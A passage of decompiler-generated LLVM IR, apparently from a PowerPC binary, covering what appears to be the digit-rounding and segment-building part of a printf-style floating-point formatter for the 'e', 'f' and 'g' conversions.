  %v0_10009eb0 = phi i32 [ %v1_10009e94, %dec_label_pc_10009e88 ], [ %v0_10009e80, %dec_label_pc_10009e80 ]
  %stack_var_-194.0 = phi i32 [ 69, %dec_label_pc_10009e88 ], [ 101, %dec_label_pc_10009e80 ]
  %v1_10009e98 = icmp slt i32 %v0_10009eb0, 103
  %v3_10009e98 = icmp eq i32 %v0_10009eb0, 103
  store i1 %v1_10009e98, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009e98, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009e98, label %dec_label_pc_10009ea0, label %dec_label_pc_10009eb0

dec_label_pc_10009ea0:                            ; preds = %dec_label_pc_10009e98
  %v0_10009ea0 = load i32, i32* %r30.global-to-local, align 4
  %v1_10009ea0 = icmp slt i32 %v0_10009ea0, 0
  %v3_10009ea0 = icmp eq i32 %v0_10009ea0, 0
  store i1 %v1_10009ea0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009ea0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009ea0, label %dec_label_pc_10009eb8, label %dec_label_pc_10009ea8

dec_label_pc_10009ea8:                            ; preds = %dec_label_pc_10009ea0
  %v1_10009ea8 = add i32 %v0_10009ea0, -1
  store i32 %v1_10009ea8, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10009eb8

dec_label_pc_10009eb0:                            ; preds = %dec_label_pc_10009e98
  %v1_10009eb0 = icmp slt i32 %v0_10009eb0, 102
  %v3_10009eb0 = icmp eq i32 %v0_10009eb0, 102
  store i1 %v1_10009eb0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009eb0, i1* %cr7_eq.global-to-local, align 1
  %v0_10009ec0 = load i32, i32* %r30.global-to-local, align 4
  br i1 %v3_10009eb0, label %dec_label_pc_10009ec0, label %dec_label_pc_10009eb8

dec_label_pc_10009eb8:                            ; preds = %dec_label_pc_10009eb0, %dec_label_pc_10009ea0, %dec_label_pc_10009ea8
  %v0_10009eb8 = phi i32 [ 0, %dec_label_pc_10009ea0 ], [ %v1_10009ea8, %dec_label_pc_10009ea8 ], [ %v0_10009ec0, %dec_label_pc_10009eb0 ]
  store i32 %v0_10009eb8, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10009ee4

dec_label_pc_10009ec0:                            ; preds = %dec_label_pc_10009eb0
  %v1_10009ec0 = load i32, i32* %r5.global-to-local, align 4
  %v2_10009ec0 = add i32 %v1_10009ec0, %v0_10009ec0
  store i32 %v2_10009ec0, i32* %r10.global-to-local, align 4
  %v1_10009ec4 = icmp slt i32 %v2_10009ec0, -1
  %v3_10009ec4 = icmp eq i32 %v2_10009ec0, -1
  store i1 %v1_10009ec4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009ec4, i1* %cr7_eq.global-to-local, align 1
  %tmp77 = icmp sgt i32 %v2_10009ec0, -2
  br i1 %tmp77, label %dec_label_pc_10009ee4, label %dec_label_pc_10009ecc

dec_label_pc_10009ecc:                            ; preds = %dec_label_pc_10009ec0
  store i32 17, i32* %r5.global-to-local, align 4
  %v2_10009ed0 = ptrtoint i32* %stack_var_-178 to i32
  store i32 %v2_10009ed0, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r4.global-to-local, align 4
  store i32 268476124, i32* @lr, align 4
  %v3_10009ed8 = call i32 @function_10006e24(i32 %v2_10009ed0, i32 48, i32 17)
  store i32 %v3_10009ed8, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10009ee4

dec_label_pc_10009ee4:                            ; preds = %dec_label_pc_10009ec0, %dec_label_pc_10009eb8, %dec_label_pc_10009ecc
  %v1_10009f08 = phi i32 [ %v2_10009ec0, %dec_label_pc_10009ec0 ], [ %v0_10009eb8, %dec_label_pc_10009eb8 ], [ -1, %dec_label_pc_10009ecc ]
  %v1_10009ee8 = icmp slt i32 %v1_10009f08, 16
  %v2_10009ee8 = icmp sgt i32 %v1_10009f08, 16
  %v3_10009ee8 = icmp eq i32 %v1_10009f08, 16
  store i1 %v1_10009ee8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009ee8, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %stack_var_-178, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  store i32 48, i32* %stack_var_-177, align 4
  %v2_10009ef8 = ptrtoint i32* %stack_var_-159 to i32
  store i32 %v2_10009ef8, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v2_10009ee8, label %dec_label_pc_10009f20, label %dec_label_pc_10009f04

dec_label_pc_10009f04:                            ; preds = %dec_label_pc_10009ee4
  %v2_10009f04 = ptrtoint i32* %stack_var_-177 to i32
  %v2_10009f08 = add i32 %v1_10009f08, %v2_10009f04
  store i32 %v2_10009f08, i32* %r9.global-to-local, align 4
  %v1_10009f0c = add i32 %v2_10009f08, 2
  %v2_10009f0c = inttoptr i32 %v1_10009f0c to i8*
  %v3_10009f0c = load i8, i8* %v2_10009f0c, align 1
  %v4_10009f0c = zext i8 %v3_10009f0c to i32
  store i32 %v4_10009f0c, i32* %r0.global-to-local, align 4
  store i32 %v1_10009f0c, i32* %r11.global-to-local, align 4
  %v1_10009f14 = sub nsw i32 52, %v4_10009f0c
  %v2_10009f14 = sub nuw nsw i32 -1, %v4_10009f0c
  %not.v5_10009f14 = icmp ugt i32 %v1_10009f14, %v2_10009f14
  %v1_10009f1c = zext i1 %not.v5_10009f14 to i32
  store i32 %v1_10009f1c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10009f20

dec_label_pc_10009f20:                            ; preds = %dec_label_pc_10009ee4, %dec_label_pc_10009f04, %dec_label_pc_10009f20.backedge
  %v0_10009f24 = phi i32 [ %v0_10009f24.pre, %dec_label_pc_10009f20.backedge ], [ 0, %dec_label_pc_10009ee4 ], [ %v1_10009f1c, %dec_label_pc_10009f04 ]
  %v0_10009f20 = phi i32 [ %v0_10009f20.pre, %dec_label_pc_10009f20.backedge ], [ %v2_10009ef8, %dec_label_pc_10009ee4 ], [ %v1_10009f0c, %dec_label_pc_10009f04 ]
  %v1_10009f20 = add i32 %v0_10009f20, -1
  %v2_10009f20 = inttoptr i32 %v1_10009f20 to i8*
  %v3_10009f20 = load i8, i8* %v2_10009f20, align 1
  %v4_10009f20 = zext i8 %v3_10009f20 to i32
  store i32 %v1_10009f20, i32* %r11.global-to-local, align 4
  %v2_10009f24 = add i32 %v4_10009f20, %v0_10009f24
  store i32 %v2_10009f24, i32* %r0.global-to-local, align 4
  %v1_10009f28 = urem i32 %v2_10009f24, 256
  store i32 %v1_10009f28, i32* %r9.global-to-local, align 4
  %v1_10009f2c = trunc i32 %v2_10009f24 to i8
  store i8 %v1_10009f2c, i8* %v2_10009f20, align 1
  %v0_10009f30 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009f30 = icmp slt i32 %v0_10009f30, 48
  %v3_10009f30 = icmp eq i32 %v0_10009f30, 48
  store i1 %v1_10009f30, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009f30, i1* %cr7_eq.global-to-local, align 1
  %v1_10009f34 = icmp ult i32 %v0_10009f30, 57
  %v2_10009f34 = icmp ugt i32 %v0_10009f30, 57
  %v3_10009f34 = icmp eq i32 %v0_10009f30, 57
  store i1 %v1_10009f34, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10009f34, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10009f34, i1* %cr6_eq.global-to-local, align 1
  %brmerge = or i1 %v3_10009f30, %v2_10009f34
  br i1 %brmerge, label %dec_label_pc_10009f20.backedge, label %dec_label_pc_10009f40

dec_label_pc_10009f20.backedge:                   ; preds = %dec_label_pc_10009f20
  %v0_10009f20.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_10009f24.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10009f20

dec_label_pc_10009f40:                            ; preds = %dec_label_pc_10009f20
  %v2_10009f40 = ptrtoint i32* %stack_var_-177 to i32
  store i32 %v2_10009f40, i32* %r0.global-to-local, align 4
  %v0_10009f44 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10009f44, i32* %r7.global-to-local, align 4
  %v0_10009f48 = load i32, i32* %r11.global-to-local, align 4
  %v2_10009f48 = icmp ult i32 %v0_10009f48, %v2_10009f40
  %v3_10009f48 = icmp ugt i32 %v0_10009f48, %v2_10009f40
  %v4_10009f48 = icmp eq i32 %v0_10009f48, %v2_10009f40
  store i1 %v2_10009f48, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10009f48, i1* %cr7_eq.global-to-local, align 1
  store i32 %v2_10009dd4, i32* %r9.global-to-local, align 4
  br i1 %v3_10009f48, label %dec_label_pc_10009f60, label %dec_label_pc_10009f54

dec_label_pc_10009f54:                            ; preds = %dec_label_pc_10009f40
  store i32 %v2_10009f40, i32* %r9.global-to-local, align 4
  %v1_10009f58 = add i32 %v0_10009f44, 1
  store i32 %v1_10009f58, i32* %r7.global-to-local, align 4
  store i32 %v2_10009f40, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009f60

dec_label_pc_10009f60:                            ; preds = %dec_label_pc_10009f40, %dec_label_pc_10009f54
  %v2_10009f68 = phi i32 [ %v0_10009f48, %dec_label_pc_10009f40 ], [ %v2_10009f40, %dec_label_pc_10009f54 ]
  %v0_10009f60 = load i32, i32* %r31.global-to-local, align 4
  %v1_10009f60 = icmp slt i32 %v0_10009f60, 103
  %v3_10009f60 = icmp eq i32 %v0_10009f60, 103
  store i1 %v1_10009f60, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009f60, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10009f68 = add i32 %v2_10009f68, 1
  %v4_10009f68 = inttoptr i32 %v3_10009f68 to i8*
  store i8 0, i8* %v4_10009f68, align 1
  %v0_10009f6c = load i32, i32* %r11.global-to-local, align 4
  %v1_10009f6c = add i32 %v0_10009f6c, 1
  store i32 %v1_10009f6c, i32* %r11.global-to-local, align 4
  %v0_10009f70 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10009f70, label %dec_label_pc_10009f74, label %dec_label_pc_10009f98

dec_label_pc_10009f74:                            ; preds = %dec_label_pc_10009f60
  %v0_10009f74 = load i32, i32* %r7.global-to-local, align 4
  %v1_10009f74 = icmp slt i32 %v0_10009f74, -4
  %v3_10009f74 = icmp eq i32 %v0_10009f74, -4
  store i1 %v1_10009f74, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009f74, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_10009f74, label %dec_label_pc_10009f90, label %dec_label_pc_10009f7c

dec_label_pc_10009f7c:                            ; preds = %dec_label_pc_10009f74
  %v1_10009f7c = load i32, i32* %r10.global-to-local, align 4
  %v2_10009f7c = icmp sgt i32 %v1_10009f7c, %v0_10009f74
  %v3_10009f7c = icmp slt i32 %v1_10009f7c, %v0_10009f74
  %v4_10009f7c = icmp eq i32 %v1_10009f7c, %v0_10009f74
  store i1 %v2_10009f7c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10009f7c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009f7c, label %dec_label_pc_10009f90, label %dec_label_pc_10009f84

dec_label_pc_10009f84:                            ; preds = %dec_label_pc_10009f7c
  %v2_10009f84 = sub i32 %v1_10009f7c, %v0_10009f74
  store i32 %v2_10009f84, i32* %r30.global-to-local, align 4
  store i32 102, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009fb0

dec_label_pc_10009f90:                            ; preds = %dec_label_pc_10009f7c, %dec_label_pc_10009f74
  store i32 103, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009fa4

dec_label_pc_10009f98:                            ; preds = %dec_label_pc_10009f60
  %v0_10009f98 = load i32, i32* %r31.global-to-local, align 4
  %v1_10009f98 = icmp slt i32 %v0_10009f98, 102
  %v3_10009f98 = icmp eq i32 %v0_10009f98, 102
  store i1 %v1_10009f98, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009f98, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_10009f98, i32* %r4.global-to-local, align 4
  br i1 %v3_10009f98, label %dec_label_pc_10009fb0thread-pre-split, label %dec_label_pc_10009fa4

dec_label_pc_10009fa4:                            ; preds = %dec_label_pc_10009f98, %dec_label_pc_10009f90
  store i32 0, i32* %r10.global-to-local, align 4
  store i1 false, i1* %cr6_lt.global-to-local, align 1
  store i1 false, i1* %cr6_gt.global-to-local, align 1
  store i1 true, i1* %cr6_eq.global-to-local, align 1
  br label %dec_label_pc_10009fc4

dec_label_pc_10009fb0thread-pre-split:            ; preds = %dec_label_pc_10009f98
  %v0_10009fb0.pr = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10009fb0

dec_label_pc_10009fb0:                            ; preds = %dec_label_pc_10009fb0thread-pre-split, %dec_label_pc_10009f84
  %v0_10009fb4 = phi i32 [ %v0_10009fb0.pr, %dec_label_pc_10009fb0thread-pre-split ], [ %v0_10009f74, %dec_label_pc_10009f84 ]
  %v1_10009fb0 = icmp slt i32 %v0_10009fb4, 0
  %v2_10009fb0 = icmp sgt i32 %v0_10009fb4, 0
  %v3_10009fb0 = icmp eq i32 %v0_10009fb4, 0
  store i1 %v1_10009fb0, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10009fb0, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10009fb0, i1* %cr6_eq.global-to-local, align 1
  store i32 %v0_10009fb4, i32* %r10.global-to-local, align 4
  %tmp78 = icmp sgt i32 %v0_10009fb4, -1
  br i1 %tmp78, label %dec_label_pc_10009fc4, label %dec_label_pc_10009fbc

dec_label_pc_10009fbc:                            ; preds = %dec_label_pc_10009fb0
  store i32 48, i32* %r0.global-to-local, align 4
  %v2_10009fc0 = load i32, i32* %r9.global-to-local, align 4
  %v3_10009fc0 = add i32 %v2_10009fc0, -1
  %v4_10009fc0 = inttoptr i32 %v3_10009fc0 to i8*
  store i8 48, i8* %v4_10009fc0, align 1
  store i32 %v3_10009fc0, i32* %r9.global-to-local, align 4
  %v1_10009fe4.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_10009ff4.pre = load i1, i1* %cr6_lt.global-to-local, align 1
  br label %dec_label_pc_10009fc4

dec_label_pc_10009fc4:                            ; preds = %dec_label_pc_10009fb0, %dec_label_pc_10009fa4, %dec_label_pc_10009fbc
  %v0_10009ff4 = phi i1 [ %v1_10009fb0, %dec_label_pc_10009fb0 ], [ false, %dec_label_pc_10009fa4 ], [ %v0_10009ff4.pre, %dec_label_pc_10009fbc ]
  %v1_10009fe4 = phi i32 [ %v1_10009f6c, %dec_label_pc_10009fb0 ], [ %v1_10009f6c, %dec_label_pc_10009fa4 ], [ %v1_10009fe4.pre, %dec_label_pc_10009fbc ]
  store i32 176, i32* %r5.global-to-local, align 4
  store i32 1, i32* %stack_var_-140, align 4
  %v0_10009fd8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009fd8 = add i32 %v0_10009fd8, 1
  store i32 %v1_10009fd8, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10009fe4 = sub i32 %v1_10009fe4, %v1_10009fd8
  store i32 %v2_10009fe4, i32* %r11.global-to-local, align 4
  %v1_10009fe8 = inttoptr i32 %v0_10009fd8 to i8*
  %v2_10009fe8 = load i8, i8* %v1_10009fe8, align 1
  %v3_10009fe8 = zext i8 %v2_10009fe8 to i32
  store i32 %v3_10009fe8, i32* %r9.global-to-local, align 4
  br i1 %v0_10009ff4, label %dec_label_pc_1000a054, label %dec_label_pc_10009ff8

dec_label_pc_10009ff8:                            ; preds = %dec_label_pc_10009fc4
  %v0_10009ff8 = load i32, i32* %r10.global-to-local, align 4
  %v2_10009ff8 = icmp slt i32 %v0_10009ff8, %v2_10009fe4
  %v4_10009ff8 = icmp eq i32 %v0_10009ff8, %v2_10009fe4
  store i1 %v2_10009ff8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10009ff8, i1* %cr7_eq.global-to-local, align 1
  store i32 112, i32* %r0.global-to-local, align 4
  store i32 112, i32* %stack_var_-132, align 4
  br i1 %v2_10009ff8, label %dec_label_pc_1000a04c, label %dec_label_pc_1000a00c

dec_label_pc_1000a00c:                            ; preds = %dec_label_pc_10009ff8
  %v2_1000a00c = sub i32 %v0_10009ff8, %v2_10009fe4
  store i32 %v2_1000a00c, i32* %r0.global-to-local, align 4
  %v4_1000a00c = icmp sgt i32 %v2_1000a00c, 0
  store i32 -1, i32* %r10.global-to-local, align 4
  br i1 %v4_1000a00c, label %dec_label_pc_1000a028, label %dec_label_pc_1000a018

dec_label_pc_1000a018:                            ; preds = %dec_label_pc_1000a00c
  %v2_1000a01c = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000a01c, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000a070

dec_label_pc_1000a028:                            ; preds = %dec_label_pc_1000a00c
  store i32 ptrtoint (i32* @global_var_1000f2d3.294 to i32), i32* %r9.global-to-local, align 4
  %v2_1000a034 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_1000a034, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 176, i32* %stack_var_-120, align 4
  br label %dec_label_pc_1000a070

dec_label_pc_1000a04c:                            ; preds = %dec_label_pc_10009ff8
  %v0_1000a04c = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_1000a04c, label %dec_label_pc_1000a05c, label %dec_label_pc_1000a050

dec_label_pc_1000a050:                            ; preds = %dec_label_pc_1000a04c
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a054

dec_label_pc_1000a054:                            ; preds = %dec_label_pc_10009fc4, %dec_label_pc_1000a050
  %v2_1000a054 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_1000a054, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a070

dec_label_pc_1000a05c:                            ; preds = %dec_label_pc_1000a04c
  %v2_1000a05c = sub i32 %v2_10009fe4, %v0_10009ff8
  store i32 %v2_1000a05c, i32* %r11.global-to-local, align 4
  %v2_1000a064 = add i32 %v0_10009ff8, %v1_10009fd8
  store i32 %v2_1000a064, i32* %r6.global-to-local, align 4
  %v2_1000a068 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000a068, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a070

dec_label_pc_1000a070:                            ; preds = %dec_label_pc_1000a054, %dec_label_pc_1000a028, %dec_label_pc_1000a018, %dec_label_pc_1000a05c
  %v1_1000a09c = phi i32 [ %v2_1000a054, %dec_label_pc_1000a054 ], [ %v2_1000a034, %dec_label_pc_1000a028 ], [ %v2_1000a01c, %dec_label_pc_1000a018 ], [ %v2_1000a068, %dec_label_pc_1000a05c ]
  %v0_1000a07c = phi i32 [ %v2_10009fe4, %dec_label_pc_1000a054 ], [ 0, %dec_label_pc_1000a028 ], [ 0, %dec_label_pc_1000a018 ], [ %v2_1000a05c, %dec_label_pc_1000a05c ]
  %v3_1000a070 = load i32, i32* %v2_10009c40, align 4
  store i32 %v3_1000a070, i32* %r0.global-to-local, align 4
  %v1_1000a074 = and i32 %v3_1000a070, 16
  store i32 %v1_1000a074, i32* %r9.global-to-local, align 4
  %v3_1000a074 = icmp eq i32 %v1_1000a074, 0
  br i1 %v3_1000a074, label %dec_label_pc_1000a07c, label %dec_label_pc_1000a094

dec_label_pc_1000a07c:                            ; preds = %dec_label_pc_1000a070
  %v1_1000a07c = icmp slt i32 %v0_1000a07c, 0
  %v3_1000a07c = icmp eq i32 %v0_1000a07c, 0
  store i1 %v1_1000a07c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a07c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a07c, label %dec_label_pc_1000a084, label %dec_label_pc_1000a094

dec_label_pc_1000a084:                            ; preds = %dec_label_pc_1000a07c
  %v0_1000a084 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000a084 = icmp slt i32 %v0_1000a084, 103
  %v3_1000a084 = icmp eq i32 %v0_1000a084, 103
  store i1 %v1_1000a084, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a084, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a084, label %dec_label_pc_1000a0b4, label %dec_label_pc_1000a08c

dec_label_pc_1000a08c:                            ; preds = %dec_label_pc_1000a084
  %v0_1000a08c = load i32, i32* %r30.global-to-local, align 4
  %v1_1000a08c = icmp slt i32 %v0_1000a08c, 0
  %v3_1000a08c = icmp eq i32 %v0_1000a08c, 0
  store i1 %v1_1000a08c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a08c, i1* %cr7_eq.global-to-local, align 1
  %tmp79 = icmp slt i32 %v0_1000a08c, 1
  br i1 %tmp79, label %dec_label_pc_1000a0b4, label %dec_label_pc_1000a094

dec_label_pc_1000a094:                            ; preds = %dec_label_pc_1000a07c, %dec_label_pc_1000a070, %dec_label_pc_1000a08c
  %v2_1000a09c = inttoptr i32 %v1_1000a09c to i32*
  store i32 112, i32* %v2_1000a09c, align 4
  store i32 ptrtoint (i32* @global_var_1000f2e0.295 to i32), i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1000a0a8 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a0a8 = add i32 %v1_1000a0a8, 8
  %v3_1000a0a8 = inttoptr i32 %v2_1000a0a8 to i32*
  store i32 ptrtoint (i32* @global_var_1000f2e0.295 to i32), i32* %v3_1000a0a8, align 4
  %v0_1000a0ac = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a0ac = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a0ac = add i32 %v1_1000a0ac, 4
  %v3_1000a0ac = inttoptr i32 %v2_1000a0ac to i32*
  store i32 %v0_1000a0ac, i32* %v3_1000a0ac, align 4
  %v0_1000a0b0 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a0b0 = add i32 %v0_1000a0b0, 12
  store i32 %v1_1000a0b0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a0b4

dec_label_pc_1000a0b4:                            ; preds = %dec_label_pc_1000a08c, %dec_label_pc_1000a084, %dec_label_pc_1000a094
  %v1_1000a0c4 = phi i32 [ %v1_1000a09c, %dec_label_pc_1000a08c ], [ %v1_1000a09c, %dec_label_pc_1000a084 ], [ %v1_1000a0b0, %dec_label_pc_1000a094 ]
  %v0_1000a0b4 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a0b4 = add i32 %v0_1000a0b4, 1
  store i32 %v1_1000a0b4, i32* %r10.global-to-local, align 4
  %v4_1000a0b4 = icmp eq i32 %v1_1000a0b4, 0
  br i1 %v4_1000a0b4, label %dec_label_pc_1000a0dc, label %dec_label_pc_1000a0bc

dec_label_pc_1000a0bc:                            ; preds = %dec_label_pc_1000a0b4
  %v1_1000a0bc = sub i32 -1, %v0_1000a0b4
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_1000a0c4 = add i32 %v1_1000a0c4, 4
  %v3_1000a0c4 = inttoptr i32 %v2_1000a0c4 to i32*
  store i32 %v1_1000a0bc, i32* %v3_1000a0c4, align 4
  store i32 ptrtoint (i32* @global_var_1000f2d3.294 to i32), i32* %r9.global-to-local, align 4
  %v0_1000a0d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a0d0 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a0d0 = inttoptr i32 %v1_1000a0d0 to i32*
  store i32 %v0_1000a0d0, i32* %v2_1000a0d0, align 4
  %v0_1000a0d4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a0d4 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a0d4 = add i32 %v1_1000a0d4, 8
  %v3_1000a0d4 = inttoptr i32 %v2_1000a0d4 to i32*
  store i32 %v0_1000a0d4, i32* %v3_1000a0d4, align 4
  %v0_1000a0d8 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a0d8 = add i32 %v0_1000a0d8, 12
  store i32 %v1_1000a0d8, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a0dc

dec_label_pc_1000a0dc:                            ; preds = %dec_label_pc_1000a0b4, %dec_label_pc_1000a0bc
  %v1_1000a0e8 = phi i32 [ %v1_1000a0c4, %dec_label_pc_1000a0b4 ], [ %v1_1000a0d8, %dec_label_pc_1000a0bc ]
  %v0_1000a0dc = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a0dc = icmp slt i32 %v0_1000a0dc, 0
  %v3_1000a0dc = icmp eq i32 %v0_1000a0dc, 0
  store i1 %v1_1000a0dc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a0dc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a0dc, label %dec_label_pc_1000a0f8, label %dec_label_pc_1000a0e4

dec_label_pc_1000a0e4:                            ; preds = %dec_label_pc_1000a0dc
  store i32 112, i32* %r0.global-to-local, align 4
  %v0_1000a0e8 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000a0e8 = add i32 %v1_1000a0e8, 8
  %v3_1000a0e8 = inttoptr i32 %v2_1000a0e8 to i32*
  store i32 %v0_1000a0e8, i32* %v3_1000a0e8, align 4
  %v0_1000a0ec = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a0ec = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a0ec = inttoptr i32 %v1_1000a0ec to i32*
  store i32 %v0_1000a0ec, i32* %v2_1000a0ec, align 4
  %v0_1000a0f0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a0f0 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a0f0 = add i32 %v1_1000a0f0, 4
  %v3_1000a0f0 = inttoptr i32 %v2_1000a0f0 to i32*
  store i32 %v0_1000a0f0, i32* %v3_1000a0f0, align 4
  %v0_1000a0f4 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a0f4 = add i32 %v0_1000a0f4, 12
  store i32 %v1_1000a0f4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a0f8

dec_label_pc_1000a0f8:                            ; preds = %dec_label_pc_1000a0dc, %dec_label_pc_1000a0e4
  %v1_1000a120 = phi i32 [ %v1_1000a0e8, %dec_label_pc_1000a0dc ], [ %v1_1000a0f4, %dec_label_pc_1000a0e4 ]
  %v0_1000a0f8 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000a0f8 = icmp slt i32 %v0_1000a0f8, 103
  %v3_1000a0f8 = icmp eq i32 %v0_1000a0f8, 103
  store i1 %v1_1000a0f8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a0f8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a0f8, label %dec_label_pc_1000a100, label %dec_label_pc_1000a10c

dec_label_pc_1000a100:                            ; preds = %dec_label_pc_1000a0f8
  %v3_1000a100 = load i32, i32* %v2_10009c40, align 4
  store i32 %v3_1000a100, i32* %r0.global-to-local, align 4
  %v1_1000a104 = and i32 %v3_1000a100, 16
  store i32 %v1_1000a104, i32* %r9.global-to-local, align 4
  %v3_1000a104 = icmp eq i32 %v1_1000a104, 0
  br i1 %v3_1000a104, label %dec_label_pc_1000a138, label %dec_label_pc_1000a10c

dec_label_pc_1000a10c:                            ; preds = %dec_label_pc_1000a0f8, %dec_label_pc_1000a100
  %v0_1000a10c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a10c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000a10c = sub i32 %v1_1000a10c, %v0_1000a10c
  store i32 %v2_1000a10c, i32* %r9.global-to-local, align 4
  %v1_1000a110 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000a110 = icmp sgt i32 %v1_1000a110, %v2_1000a10c
  %v4_1000a110 = icmp eq i32 %v1_1000a110, %v2_1000a10c
  store i1 %v2_1000a110, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a110, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000a110, label %dec_label_pc_1000a118, label %dec_label_pc_1000a138

dec_label_pc_1000a118:                            ; preds = %dec_label_pc_1000a10c
  %v2_1000a118 = sub i32 %v1_1000a110, %v2_1000a10c
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_1000a120 = add i32 %v1_1000a120, 4
  %v3_1000a120 = inttoptr i32 %v2_1000a120 to i32*
  store i32 %v2_1000a118, i32* %v3_1000a120, align 4
  store i32 ptrtoint (i32* @global_var_1000f2d3.294 to i32), i32* %r9.global-to-local, align 4
  %v0_1000a12c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a12c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a12c = inttoptr i32 %v1_1000a12c to i32*
  store i32 %v0_1000a12c, i32* %v2_1000a12c, align 4
  %v0_1000a130 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a130 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a130 = add i32 %v1_1000a130, 8
  %v3_1000a130 = inttoptr i32 %v2_1000a130 to i32*
  store i32 %v0_1000a130, i32* %v3_1000a130, align 4
  %v0_1000a134 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a134 = add i32 %v0_1000a134, 12
  store i32 %v1_1000a134, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a138

